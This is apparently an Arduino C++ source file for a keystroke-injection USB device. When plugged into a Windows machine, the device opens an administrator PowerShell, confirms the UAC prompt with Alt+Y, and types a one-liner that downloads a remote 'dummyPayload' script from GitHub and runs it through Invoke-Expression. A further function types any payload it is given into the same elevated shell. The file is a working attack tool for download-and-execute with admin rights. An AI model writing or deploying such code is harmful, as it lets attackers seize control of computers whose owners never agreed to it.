#ifdef HW_ARDUINO
#include <key.h>
// #include <serials.h>

KEYBOARD::KEYBOARD() {}

void KEYBOARD::up() {
    Keyboard.begin();
    delay(500);
}

void KEYBOARD::openPS() {
    Keyboard.press(KEY_LEFT_GUI);
    delay(50);
    Keyboard.press('x');
    delay(150);
    Keyboard.releaseAll();
    delay(150);
    delay(50);
    Keyboard.press('a');
    delay(50);
    Keyboard.release('a');
    delay(600);
    Keyboard.press(KEY_LEFT_ALT);
    delay(50);
    Keyboard.press('y');
    delay(150);
    Keyboard.releaseAll();
    delay(600);
}

void KEYBOARD::pullScript() {
    KEYBOARD::openPS();
    Keyboard.println("$ScriptFromGitHub = Invoke-WebRequest https://raw.githubusercontent.com/mr-foxi/dummyPayload/refs/heads/main/dummyPayload.ps1; Invoke-Expression $($ScriptFromGitHub.Content)");
    Serial1.println("#Roger Roger#");
}
void KEYBOARD::pullScriptExit() {
    KEYBOARD::openPS();
    Keyboard.println("$ScriptFromGitHub = Invoke-WebRequest https://raw.githubusercontent.com/mr-foxi/dummyPayload/refs/heads/main/dummyPayload.ps1; Invoke-Expression $($ScriptFromGitHub.Content); exit");
    Serial1.println("#Roger Roger#");
}

void KEYBOARD::runPayload(String payload) {
    KEYBOARD::openPS();
    Keyboard.println(payload);
    Serial1.println("#Roger Roger#");
}

KEYBOARD key = KEYBOARD();

#endif